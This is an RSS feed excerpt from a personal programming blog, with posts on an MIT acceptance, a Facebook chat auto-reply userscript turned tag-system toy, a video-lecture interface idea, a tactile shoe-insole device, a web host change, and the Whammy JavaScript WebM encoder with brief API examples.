      <guid isPermaLink="true">http://antimatter15.com/2013/01/mit/</guid>
      <author></author>
      <description>&lt;p&gt;On December 15th, 2012 12:15pm, I was accepted Early Action to the Massachusetts Institute of Technology, so I’ll be there starting this fall :)&lt;/p&gt;
&lt;p&gt;This blog isn’t principally here to boost my ego, so I’ll leave it at that, because I’m writing this post some six months after-the-fact with a fake retroactive timestamp in order to fraud my monthly post-count goal.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Facebook Chat Bot, Turing Completeness</title>
      <link>http://antimatter15.com/2012/12/facebook-chat-bot-turing-completeness/</link>
      <pubDate>Sun, 30 Dec 2012 21:12:07 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/12/facebook-chat-bot-turing-completeness/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Facebook%20Chat%20Bot,%20Turing%20Completeness/collatz-2.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Facebook%20Chat%20Bot,%20Turing%20Completeness/collatz-2.png&quot; &gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Okay, so I really want to maintain at least &lt;a href=&quot;http://antimatter15.com/wp/2012/08/upcoming-changes/&quot;&gt;one blog post per month&lt;/a&gt;, and here I am, right before New Year’s with no apocalypse in sight to rapture me away from having to write a blog post. I don’t have anything particularly interesting ready to share, so here’s something fun that only took a few hours.&lt;/p&gt;
&lt;p&gt;The rather long &lt;a href=&quot;http://en.wikipedia.org/wiki/Bayeux_Tapestry&quot;&gt;Bayeux tapestry&lt;/a&gt; of an image I have crammed to the right marks the culmination of a series of rather odd tangents. It also serves as a reminder for me to &lt;a href=&quot;http://en.wikipedia.org/wiki/Inferno_(Dante&quot;&gt;abandon hope&lt;/a&gt;#Overview_and_vestibule_of_Hell), because the shape of the conversation forces whatever post I plan on writing to be verbose enough as to fill all that vertical space so that the actual text here isn’t dwarfed by the image, which would be aesthetically jarring.&lt;/p&gt;
&lt;p&gt;It all started the day before yesterday (I’m pretty sure it wasn’t actually then, but this is my abridged timeline and I’m entitled to indulge in whatever revisionist temptations I have as I’m writing this at a rather late hour, because 2013 is creeping closer at an uncomfortably fast rate and I still have some finite quantity of homework I haven’t attempted to start over the course of the past week), when my friend Robert realized that a rather significant portion of my chat responses include “wat”, “walp”, “lol”, “yeah”, “:P”, “cool”. From that, he logically sought to create a naive bayes predictor of me, because, why have a person nod in consent, when you can have a robot which can, to some degree of accuracy, automatically give that nod of assent without bothering a physical human being.&lt;/p&gt;
&lt;p&gt;This isn’t quite the same thing as a traditional chat bot, because traditional chat bots don’t pretend to be actual people, largely because the state-of-the-art of artificial intelligence is quite a ways off from creating something which can suitably pass a Turing test, and even further away from being able to learn the entire knowledge of a person and provide an intelligent response to every imaginable stimulus. A closer approximation would be that this is a sort of semi-automated chat-macro system, whereby my generally useless responses of agreement are outsourced to a rudimentary script, fully capable of replicating my own rather unhelpful self. And from that it’s able to try to behave human by replicating a very very narrow subset of activity, deferring to a real human transparently.&lt;/p&gt;
&lt;p&gt;It’s somewhat like how GMail has a &lt;a href=&quot;http://support.google.com/mail/bin/answer.py?hl=en&amp;amp;answer=186531&quot;&gt;priority inbox&lt;/a&gt; feature which uses magical algorithms to separate the wheat from the chaff, diverting your attention away from the less subjectively important emails toward the few which actually matter. Except instead of giving the user ultimate discretion over the emails, this one would simply reply with “lol”.&lt;/p&gt;
&lt;p&gt;It’s pretty easy to see any realistic application of this as rare. But I could totally be wrong, and I could be seeing this from totally the wrong angle. It’s entirely plausible that some subtle variant of this idea is absolutely brilliant, and will serve as the future of networked communication for decades to come. Maybe as email evolves the way of the Dodo, Instant Messaging will become the semi-permanent high-persistence low-immediacy ironic-initialism that &lt;a href=&quot;https://medium.com/product-design/d8d4f2300cf3&quot;&gt;takes email’s place&lt;/a&gt;, and the  rest of the world becomes burn-on-reading SnapChats. Maybe SnapChat gets combined with lifelogging, and every minute of your life gets divided into four second snippets, and sent to one of your four thousand middle-school friends, so they can bask in the new hyper-intimate super-network, fueled by non-discretionary artificial intelligence filters.&lt;/p&gt;
&lt;p&gt;That was Robert’s end anyway. He went on combing through our accumulated ~30,000 messages with his handy Mathematica trying to identify pertinent features which might probably replace me. On my side of the thing, I started with the userscript which would run on my browser to intercept the messages he sent, process them, and to send out a response, if a suitable automated one existed.&lt;/p&gt;
&lt;p&gt;This actually turned out to be slightly more difficult than I had anticipated, for a single reason, and it was and has been the same reason that has bothered me for quite some time. Firing events. I really probably should learn how to use Selenium or something to automate things in a nice and clean way.&lt;/p&gt;
&lt;p&gt;And that’s completely ignoring the five hundred pound trivial solution in the room, which isn’t to use a 500lb gorilla as a metaphor. Facebook supports XMPP which is a nice open source protocol with a billion implementations and it’s really not that hard to automate. I mean I’ve even done it before. &lt;a href=&quot;http://antimatter15.com/wp/2012/08/raspberry-pi/&quot;&gt;I have a Raspberry Pi&lt;/a&gt; after all, and I can use it to run useless services like this, because I’ve decided that that’s exactly what a Raspberry Pi is for. But I didn’t and I have no idea why. C’est la vie, I guess.&lt;/p&gt;
&lt;p&gt;The secret ended up being to Google a bunch of phrases related to keyboard-event-emitting with initializeKeyboardEvent or something of that sort a lot of times and stealing some code from StackOverflow. It took a few tries, but eventually something that worked emerged, and it was cool.&lt;/p&gt;
&lt;p&gt;For posterity, this was the code that worked:&lt;/p&gt;
&lt;script src=&quot;https://gist.github.com/4425144.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;But that wasn’t the end of it. No, now there was a piece of code which could convincingly send a message, but it also had to read messages too. That wasn’t hard, actually, I just created a MutationObserver object and named it after a&lt;a href=&quot;http://fringe.wikia.com/wiki/September&quot;&gt; Fringe character&lt;/a&gt;. But then, presumably because Robert’s code was still training on that 30k message corpus, or something inexplicable, I built a crappy rudimentary thing with four or so simple regular expression based rules.&lt;/p&gt;
&lt;p&gt;One of them happened to be that if someone were to send me the message “lol”, I would inexplicably respond as well with “lol”. This wasn’t initially a problem because the idea was to create a robotic version of &lt;em&gt;me&lt;/em&gt; and _only _me. But Robert found it cool too so he ran the same script. Problem was, that this meant that if either one of us were to introduce the word “lol”, it would spiral nigh perpetually ad nauseam.&lt;/p&gt;
&lt;p&gt;Somehow this sparked the idea to implement simple esoteric languages on it. The first one was a simple substitution rule. 0 -&amp;gt; 1, 1 -&amp;gt; 10. And over a few iterations it grew and took up huge amounts of space.&lt;/p&gt;
&lt;p&gt;Next up was implementing a &lt;a href=&quot;http://en.wikipedia.org/wiki/Tag_system&quot;&gt;tag system&lt;/a&gt;. I implemented the 2-tag collatz sequence one. The cool thing is that it’s actually insanely easy to implement. You just take a sequence of symbols, strip the first two, and append the first symbol after you’ve transformed it according to a certain transformation mapping.&lt;/p&gt;
&lt;p&gt;It was interesting as each little computation of this tiny esolang of a chat conversation involved a round trip of hundreds of miles. But each tag was still letters, ‘a’, ‘b’, and ‘c’. And it was getting late, and I thought that maybe it would be nice to hark back at inside-joke/theory of sorts that sparked it all. So I decided that our tags could be, instead of solitary letters, comprise word symbols like “lol”, “d:” and “wat”, which perhaps is a subconscious reference to an old webcomic that I had posted a while ago about a steganographic system built on internet vernacular.&lt;/p&gt;
&lt;p&gt;I updated my script, posted it to him, he ran it, and initiated it all by saying “lol lol lol”. And from then the line lengths grew and shrank like mountainous terrain, eventually converging on the final state, a solitary “lol”. And for some inexplicable reason, some weird quirk of fate, or some deeper underlying truth to the universe, Robert always got the last “lol”. When I had tried it with a random initiating code, it would always terminate in some odd number of iterations, leaving me with the lowly penultimate laugh.&lt;/p&gt;
&lt;p&gt;It sort of broke after that, and we didn’t fix it.&lt;/p&gt;
&lt;p&gt;Nonetheless, there’s something incredibly cool about how an idea for something questionably turing-test-worthy can evolve into something turing-complete.&lt;/p&gt;
&lt;p&gt;And that’s a basic summary of how uneventful my winter break has been, incidentally written with exactly 1337 words.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>A New Approach to Video Lectures</title>
      <link>http://antimatter15.com/2012/11/a-new-approach-to-video-lectures/</link>
      <pubDate>Tue, 20 Nov 2012 23:01:39 -0500</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/11/a-new-approach-to-video-lectures/</guid>
      <author></author>
      <description>&lt;p&gt;At time of writing, a video is being processed by my &lt;code&gt;v2.py&lt;/code&gt; script, it’s only eight lines of code thanks to the beautifully terse nature of python and SimpleCV. And since it’s clearly not operating at the breakneck speed of one frame per second, I don’t have time to write this README, meaning that I’m writing this README. But since I haven’t actually put a description of this project out in writing before, I think it’s important to start off with an introduction.&lt;/p&gt;
&lt;p&gt;It’s been over a year since I first wrote code for this project. It really dates back to late April 2011. Certainly it wouldn’t have been possible to write the processor in eight painless lines of python back then, when SimpleCV was considerably in more of an infancy. I’m pretty sure that puts the pre-production stage of this project in about the range of a usual Hollywood movie production. However, that’s really quite unusual for me because I don’t tend to wait to get started on projects often. Or at least, I usually publish something in a somewhat workable state before abandoning it for a year.&lt;/p&gt;
&lt;p&gt;However, the fact is that this project has been dormant for more than an entire year. Not necessarily because I lost interest in it, but because it always seemed like a problem harder than I had been comfortable tackling at any given moment. There’s a sort of paradox that afflicts me, and probably other students (documented by that awesome Calvin and Hobbes comic) where at some point, you find a problem hard enough that it gets perpetually delayed until, of course, the deadline comes up and you end up rushing to finish it in some manner that only poses a vague semblance to the intent.&lt;/p&gt;
&lt;p&gt;The basic premise is somewhat simple: videos aren’t usually the answer. That’s not to say video isn’t awesome, because it certainly is. YouTube, Vimeo and others provide an absolutely brilliant service, but those platforms are used for things that they aren’t particularly well suited for. Video hosting services have to be so absurdly general because there is this need to encompass every single use case in a content-neutral manner.&lt;/p&gt;
&lt;p&gt;One particular example is with music, which often gets thrown on YouTube in the absence of somewhere else to stick it. A video hosting site is pretty inadequate, in part because it tries to optimize the wrong kinds of interactions. Having a big player window is useless, having an auto-hiding progress slider and having mediocre playback, playlist and looping interfaces are signs that a certain interface is being used for the wrong kind of content. Contrast this to a service like SoundCloud which is entirely devoted to the interacting with music.&lt;/p&gt;
&lt;p&gt;The purpose of this project is somewhat similar. It’s to experiment with creating an interface for video lectures that goes above, in terms of interactivity and in terms of usability (perhaps even accessibility), what a simple video can do.&lt;/p&gt;
&lt;p&gt;So yeah, that’s the concept that I came up with a year ago. I’m pretty sure it sounds like a pretty nice premise, but really at this point the old adage of “execution is everything” starts to come into play. How exactly is this going to be better than video?&lt;/p&gt;
&lt;p&gt;One thing that’s constantly annoyed me about anything video-related is the little progress slider tracker thing. Even for a short video, I always end up on the wrong spot. YouTube has the little coverflow-esque window which gives little snapshots to help, and Apple has their drag down to do precision adjustment, but in the end the experience is far from optimal. This is especially unsuitable because moreso in lectures than perhaps in any other type of content, you really want to be able to step back and go over some little thing again. Having to risk cognitive derailment just to go over something you don’t quite get can’t possibly be good (actually, for long videos in general, it would be a good idea to snap the slider to the nearest camera/scene change which wouldn’t be hard to find with basic computer vision, since that’s in general, where I want to go). But for this specific application, the canvas itself makes perhaps the greatest navigatory tool of all. The format is just a perpetually amended canvas with redactions rare, and the most sensible way to navigate is by literally clicking on the region that needs explanation.&lt;/p&gt;
&lt;p&gt;But having a linear representation of time is useful for pacing, and to keep track of things when there isn’t always a clear relationship between the position of the pen and time. A more useful system would have to be something more than just a solid gradient bar crawling across the bottom edge of the screen, because it would also convey where in the content the current step belongs. This is something analogous to the way YouTube shows a strip of snapshots when thumbing through the slider bar, but in a video-lecture setting we have the ability to automatically and intelligently build populate the strip with with specific and useful information.&lt;/p&gt;
&lt;p&gt;From this foundation we can imagine looking at the entire lecture in it’s final end state, except with the handwriting grayed out. The user can simply circle or brush over the regions which might seem less trivial, and the interface could automatically stitch together a customized lecture at just the right pacing, playing back the work correlated with audio annotations. On top of that, the user can interact with the lecture by contributing his or her own annotations or commentary, so that learning isn’t confined to the course syllabus.&lt;/p&gt;
&lt;p&gt;Now, this project, or at least its goals evolved from an idea to vectorize Khan Academy. None of these truly requires a vector input source, in fact many of the ideas would be more useful implemented with raster processing and filters, by virtue of having some possibility of broader application. I think it may actually be easier to do it with the raster method, but I think, if this is possible at all, it’d be cooler to do it using a vector medium. Even if having a vector source was a prerequisite, it’d probably be easier to patch up a little scratchpad-esque app to record mouse coordinates and to re-create lectures rather than fiddling with SimpleCV in order to form some semblance of a faithful reproduction of the source.&lt;/p&gt;
&lt;p&gt;I’ve had quite a bit to do in the past few months, and that’s been reflected in the kind of work I’m doing. I guess there’s a sort of prioritization of projects which is going on now, and this is one of those which has perennially sat on the top of the list, unperturbed. I’ve been busy, and that’s led to this wretched mentality to avoid anything that would take large amounts of time, and I’ve been squandering my time on small and largely trivial problems (pun not intended).&lt;/p&gt;
&lt;p&gt;At this point, the processing is almost done, I’d say about 90%, so I don’t have much time to say anything else. I really want this to work out, but of course, it might not. Whatever happens, It’s going to be something.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Introduction to the Pedant</title>
      <link>http://antimatter15.com/2012/10/introduction-to-the-pedant/</link>
      <pubDate>Sun, 07 Oct 2012 04:08:15 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/10/introduction-to-the-pedant/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Introduction%20to%20the%20Pedant/IMG_20120924_231208.jpg&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Introduction%20to%20the%20Pedant/IMG_20120924_231208-300x224.jpg&quot; &gt;&lt;div class=&quot;caption&quot;&gt;IMG_20120924_231208&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Recently, I’ve been racking up on hobbyist electronics components from &lt;a href=&quot;http://sparkfun.com&quot;&gt;Sparkfun&lt;/a&gt;. Actually, this has been going on for quite a while, and most of that spending was justified by this project, which currently has the working name of the “pedant” (which is like at least a three-layered pun). I won’t say that it’s my very first foray into building some actual piece of hardware, but it’s probably the biggest and most original hardware project I’ve ever attempted.&lt;/p&gt;
&lt;p&gt;I probably won’t be able to sell you on what it &lt;em&gt;is&lt;/em&gt;, because it’s actually quite simple and uninteresting in principle. So instead of selling you on the cynical summary of its functionality, I’ll gild the concept with buzz words and try my very best to instill the same kind of enthusiasm I have for this project (which might just be because I haven’t done anything before with e-textiles or other electronics stuff).&lt;/p&gt;
&lt;p&gt;The &lt;strong&gt;pedant is my foray into augmented reality, &lt;/strong&gt;hopefully that means that it’s, at least some ways, original. It’s &lt;strong&gt;cheap&lt;/strong&gt;, though actually in retrospect, not nearly as cheap as it &lt;em&gt;should&lt;/em&gt; have been. And probably the most interesting aspect is that it skips through the whole perceived evolution of augmented reality from some bulky extremity into something sleek and unobtrusive. That’s not technically untrue, because the actual device will be fairly bulky, but it would exist in an already considerably bulky device (a shoe), so the &lt;strong&gt;net effect is that it’s sleek and unobtrusive&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;I can’t say I was into that whole augmented reality thing before it was hip and cool. I only got interested in it fairly recently, likely due to somewhat high profile forays by Google and others. In mid-to-late 2008, I had just gotten my iPhone and I was &lt;em&gt;deeply&lt;/em&gt; attached to it. At one point, I was on a vacation and at one point there was some arbitrary fact which came into question, at which point I pulled out my glorious first generation iPhone with its pristine anodized aluminium backing and loaded an app which searched an offline copy of all the textual content in the English Wikipedia (a concept which I had become so attached with that I ended up making Offline Wiki for the same reasons). And as the question was settled, the new subject of conversation was how incredible it is to keep all the world’s knowledge in a palm sized device.&lt;/p&gt;
&lt;p&gt;But that’s not just an anecdote about the marvels of technology, it’s also a sad tale about how distracting it was. Somehow having access to that information allowed whatever &lt;em&gt;pedantic&lt;/em&gt; instincts to prevail, shifting the conversation from a meaningful discussion into an artless digital query. And even forgiving that fact, it was slow and distracting, destroying the asynchronous exchange of ideas by creating this handheld bottleneck. Yes, we got an answer, but at what cost?&lt;/p&gt;
&lt;p&gt;And I think that is a beautiful way to frame the argument for augmented reality. That whatever reality we have now is already being corrupted by the influence of the virtual world, and that only by willfully acknowledging that they both share the same space, can we start in the right direction of fixing it. That’s the direction Google’s Project Glass is headed, and I think that’s the right way.&lt;/p&gt;
&lt;p&gt;The approach taken by the &lt;a href=&quot;http://www.pranavmistry.com/projects/sixthsense/&quot;&gt;SixthSense&lt;/a&gt; project and by Google Glass mainly interacts with the user in a visual manner. And for the latter, there isn’t any really “good” and unobtrusive way to interact with that information. Both of the projects have extremely high output bandwidth (conveying information by projecting it into the user’s eye in one way or another), but limited input bandwidth and still fairly non-discreet (waving hands around to form shapes and sliding a bar on the frame, respectively). The Pedant takes a different approach by focusing on tactile input and output. This places the project more in the league of people who &lt;a href=&quot;http://hackaday.com/2012/05/13/hacking-magnets-into-your-skin/&quot;&gt;implant magnets under their skin&lt;/a&gt; by hijacking the sense of touch to convey information about the surroundings.&lt;/p&gt;
&lt;p&gt;It’s going to be a tiny device which fits within the dimensions of a shoe insole including an Arduino Pro, a Bluetooth Mate, an Accelerometer, 2000mAh LiPo battery, and three or more vibration motors. By tapping the foot (or by orienting it in slightly different ways) the user can input data in a manner similar to the telegraph. However, nothing necessarily restricts it to being sent through a single “stream”, so it could end up more like a chorded telegraph (a la &lt;a href=&quot;http://en.wikipedia.org/wiki/Chorded_keyboard&quot;&gt;chorded keyboard&lt;/a&gt;). The great thing is that with chording, it becomes much more practical to receive information at reasonable rates.&lt;/p&gt;
&lt;p&gt;Just like how a cell phone can vibrate to signal that the user has been left a message, the pedant would be used primarily to handle notifications, but rather than indistinguishable general sensations on the thigh, it’ll portray the type of notifications as well as the content, and the user even has the possibility to respond without changing the environment.&lt;/p&gt;
&lt;p&gt;Without weird tactile abstract character sets, the Pedant could be interesting just as a sort of social network where users can feel the presence of other users in their general vicinity. It could monitor the footsteps of all nearby Pedant wearers and as it’s connected via a cellular data network and a smartphone GPS to trigger the specific vibration motors to evoke an awareness of how fast they’re walking and what general direction they are. In a sense, a social network of pedometers.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>New Host Bitcable</title>
      <link>http://antimatter15.com/2012/09/new-host-bitcable/</link>
      <pubDate>Sun, 30 Sep 2012 07:23:00 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/09/new-host-bitcable/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/New%20Host%20Bitcable/1LlLi.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/New%20Host%20Bitcable/1LlLi-300x218.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;1LlLi&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I haven’t been particularly raving about Hostmonster for the near two years I’ve been a customer of their’s, and it’s time for a change. In the past week, I moved to a new web host. As of this moment, I’m using Bitcable, specifically the cheapest shared plan plus another discount. I’ve had my share of gripes about the service, but speed and reliability so far have not been among them. I discovered Bitcable through a friend who knew a friend who operated a web host, well, primarily a VPS service. Over a fair amount of begging for a VPS discount, I decided to try out their (I always find it awkward when referring to companies or services as a plural in spite of knowledge that it’s pretty much a one-man-show, but that makes it all the more impressive) shared plan, since that was analogous whatever I was paying for with Hostmonster. And anyway, for $2/mo, how bad can it get?&lt;/p&gt;
&lt;p&gt;That question was a tad misleading, so far, Bitcable’s pretty awesome. Part of the thing about using a service from a friend-of-a-friend (FOAF, if I ever need to use an acronym later on in this post, but I’ll keep it here just because it’s a fun thing to say) is that you can get some pretty good support over some random communication channels. It’s small enough that he doesn’t oversell, and the performance really shows through.&lt;/p&gt;
&lt;p&gt;I did, however have some issues with the configuration of the server. The first issue is that by default, shared customers don’t get SFTP access. That’s pretty annoying because I’ve recently fallen in love with passwordless login using public keys. I sent an angry support ticket and it was enabled soon enough. But a much more pressing issue was that soon after my migration, there was some long server outage due to some power supply failure (which thankfully, since it took over a month to write this post which is more indicative of the bad state that my blog is in than the host, hasn’t happened again, I haven’t noticed a minute of downtime since then and I’ve set uptime monitors to ensure that).&lt;/p&gt;
&lt;p&gt;So yeah, I’ll be on this host for the foreseeable future.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Whammy: A Real Time Javascript WebM Encoder</title>
      <link>http://antimatter15.com/2012/08/whammy-a-real-time-javascript-webm-encoder/</link>
      <pubDate>Sun, 19  Aug 2012 06:46:46 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/08/whammy-a-real-time-javascript-webm-encoder/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Whammy%20A%20Real%20Time%20Javascript%20WebM%20Encoder/screenshot.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Whammy%20A%20Real%20Time%20Javascript%20WebM%20Encoder/screenshot.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;screenshot&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This is sort of a conceptual reversal (or not, this might just be making the description needlessly confusing) of one of my older projects,&lt;a href=&quot;https://github.com/antimatter15/weppy&quot;&gt;Weppy&lt;/a&gt;. First, what Weppy did was it added support for WebP in browsers which didn’t support it by converting it into a single-frame video. This is instead predicated on the assumption that the browser already has support for WebP (at this point, it means it only works on Chrome since it’s the only browser which actually supports WebP), not only decoding WebP but encoding it as well.&lt;/p&gt;
&lt;p&gt;The cool thing about WebP which was exploited in Weppy is that it’s actually based on the same codec as WebM, On2’s VP8. That means the actual image data, when the container formats are ignored, are virtually interchangable. With a catch: it’s intraframe only.&lt;/p&gt;
&lt;p&gt;So it’s a video encoder in that it generates &lt;code&gt;.webm&lt;/code&gt; files which should play in just about any program or device which supports the WebM format. But interframe compression is actually a fairly important thing which could reduce the file size by an order of magnitude or more.&lt;/p&gt;
&lt;p&gt;But, there isn’t too much you can do on the client side in the ways of encoding stuff. And whatever you do, you basically can’t do interframe compression (aside from some really rudimentary delta encoding). More or less, when your only alternative is to maintain an array of DataURL encoded frames or encoding it (rather slowly) as a &lt;a href=&quot;https://github.com/antimatter15/jsgif&quot;&gt;GIF&lt;/a&gt;, a fast but inefficient WebM encoder stops looking too bad.&lt;/p&gt;
&lt;p&gt;This was actually &lt;a href=&quot;https://github.com/gengkev&quot;&gt;Kevin Geng&lt;/a&gt;‘s idea, and he contributed some code too, but in the end most of the code was just leftovers from Weppy.&lt;/p&gt;
&lt;h2 id=&quot;demo&quot;&gt;Demo&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;http://antimatter15.github.com/whammy/clock.html&quot;&gt;http://antimatter15.github.com/whammy/clock.html&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;basic-usage&quot;&gt;Basic Usage&lt;/h2&gt;
&lt;p&gt;First, let’s include the JS file. It’s self contained and basically namespaced, which is pretty good I guess. And it’s not too big, minified it’s only about 4KB and gzipped, it’s under 2KB. That’s like really really tiny.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='handlebars'&gt;&lt;/span&gt;&lt;span class=&quot;xml&quot;&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;src&lt;/span&gt;=&lt;span class=&quot;hljs-value&quot;&gt;&quot;whammy.js&quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;javascript&quot;&gt;&lt;/span&gt;&lt;span class=&quot;hljs-tag&quot;&gt;&amp;lt;/&lt;span class=&quot;hljs-title&quot;&gt;script&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The API isn’t terrible either (at least, that’s what I’d like to hope)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='coffeescript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-reserved&quot;&gt;var&lt;/span&gt; encoder = &lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; Whammy.Video(&lt;span class=&quot;hljs-number&quot;&gt;15&lt;/span&gt;); 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;That &lt;code&gt;15&lt;/code&gt; over there is the frame rate. There’s a way to set the individual duration of each frame manually, but you can look in the code for that.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='vhdl'&gt;&lt;/span&gt;encoder.add(&lt;span class=&quot;hljs-keyword&quot;&gt;context&lt;/span&gt; &lt;span class=&quot;hljs-keyword&quot;&gt;or&lt;/span&gt; canvas &lt;span class=&quot;hljs-keyword&quot;&gt;or&lt;/span&gt; dataURL); 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, you can add a frame, this happens fairly quickly because basically all it’s doing is running &lt;code&gt;.toDataURL()&lt;/code&gt; on the canvas (which isn’t exactly a speed-demon either, but it’s acceptable enough most of the time) and plopping the result onto an array (no computation or anything). The actual encoding only happens when you call &lt;code&gt;.compile()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='coffeescript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-reserved&quot;&gt;var&lt;/span&gt; output = encoder.compile(); 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here, output is set to a Blob. In order to get a nice URL which you can use to stick in a &lt;code&gt;&amp;amp;lt;video&amp;amp;gt;&lt;/code&gt; element, you need to send it over to&lt;code&gt;createObjectURL&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='coffeescript'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-reserved&quot;&gt;var&lt;/span&gt; url = (&lt;span class=&quot;hljs-built_in&quot;&gt;window&lt;/span&gt;.webkitURL || &lt;span class=&quot;hljs-built_in&quot;&gt;window&lt;/span&gt;.URL).createObjectURL(output); 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And you’re done. Awesome.&lt;/p&gt;
&lt;h2 id=&quot;documentation&quot;&gt;Documentation&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;Weppy.fromImageArray(image[], fps)&lt;/code&gt; this is a simple function that takes a list of DataURL encoded frames and returns a WebM video. Note that the images have to all be encoded with WebP.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;new Weppy.Video(optional fps, optional quality)&lt;/code&gt; this is the constructor for the main API. quality only applies if you’re sending in contexts or canvas objects and doesn’t matter if you’re sending in encoded stuff&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.add(canvas or context or dataURL, optional duration)&lt;/code&gt; if fps isn’t specified in the constructor, you can stick a duration (in milliseconds) here.&lt;/p&gt;
&lt;h2 id=&quot;todo&quot;&gt;Todo&lt;/h2&gt;
&lt;p&gt;This pretty much works as well as it possibly could at this point. Maybe one day it should support WebWorkers or something, but unlike the GIF Encoder, it doesn’t actually require much real computation. So doing that probably wouldn’t net any performance benefits, especially since it can stitch together a 120-frame animation in like 20 milliseconds already.&lt;/p&gt;
&lt;p&gt;But one of the sad things about it is that now it uses Blobs instead of strings, which is great and all except that blobs are actually slower than strings because it still has to do the DataURL conversion from string to Blob. That’s pretty lame. Firefox supports the canvas toBlob thing, but for some reason Chrome doesn’t, but eventually it probably might, and that might be useful to add.&lt;/p&gt;
&lt;p&gt;Also, if someone ever makes a Javascript Vorbis encoder, it would be nice to integrate that in, since this currently only does the video part, but audio’s also a pretty big part.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Upcoming Changes</title>
      <link>http://antimatter15.com/2012/08/upcoming-changes/</link>
      <pubDate>Fri, 17  Aug 2012 21:16:52 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2012/08/upcoming-changes/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2012/Upcoming%20Changes/blog-post-frequency.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2012/Upcoming%20Changes/blog-post-frequency-150x150.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;blog-post-frequency&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;This post has been hinted at by the past few blog posts, but I guess eventually it has to be written. But the basic gist is that rather than making this the home of random announcements of mostly finished projects, it’ll be the home of mostly daily (or weekly, whenever significant progress is made) and probably shorter updates on the progress certain projects. That is, the blog is transitioning back into something more like the olden days (circa 2008-ish) but without falling into the trap of using this as an alternative to having commit messages and still supporting the fact I’m now working on quite a bit more than one project at a time.&lt;/p&gt;
&lt;p&gt;The problem is that I can’t exactly stay true to that because I actually have quite a bit of backlog in terms of stuff I have to write about, stuff which is for the most part done (so it’s not particularly viable for me to make up progress updates retroactively, and I’ll probably have to stick with writing a big blog post about it).&lt;/p&gt;
&lt;p&gt;This should be the culmination of tons of factors and trends building up for the past year or so. I’ve always felt that the blog needed to be overhauled eventually (or end up rotting as nothing more than a backup kept in the eternal resting spot which is the Internet Archive, leaching fluids into the soil as bacterium leave the corpse punctured by holes and missing vital organs, a sure sign that I’m probably going too far into this metaphor, but in the end that’s the way many of the forums I used to visit have become). But the real spark came in the form of a migration to a new web host, something which I still alas have yet to blog about despite it happening over a week ago.&lt;/p&gt;
